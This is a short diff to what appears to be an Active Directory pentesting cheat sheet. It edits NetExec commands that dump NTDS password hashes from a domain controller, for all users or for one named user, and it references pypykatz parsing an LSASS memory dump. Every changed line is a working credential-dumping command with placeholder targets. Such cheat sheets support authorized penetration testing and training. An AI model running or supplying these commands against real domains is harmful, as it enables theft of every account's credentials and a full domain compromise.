@@ -883,12 +883,12 @@ pypykatz lsa minidump lsass.DMP
 
 #### Dump all user hashes
 ```shell
-NetExec smb <Domain_Controller_IP> -d <AD_domain> -u <AD_user> -p <AD_password> -H <hash[LM:NT]> -K <kerbticket[./krb5cc_ticket]>  --ntds
+NetExec smb <Domain_Controller_IP> -d <AD_domain> -u <AD_user> -p <AD_password> --ntds
 ```
 
 #### Dump a specific user hash
 ```shell
-NetExec smb <Domain_Controller_IP> -d <AD_domain> -u <AD_user> -p <AD_password> -H <hash[LM:NT]> -K <kerbticket[./krb5cc_ticket]>  --ntds --user <AD_user>
+NetExec smb <Domain_Controller_IP> -d <AD_domain> -u <AD_user> -p <AD_password> --ntds --user <AD_user>
 ```
 </details> 
 
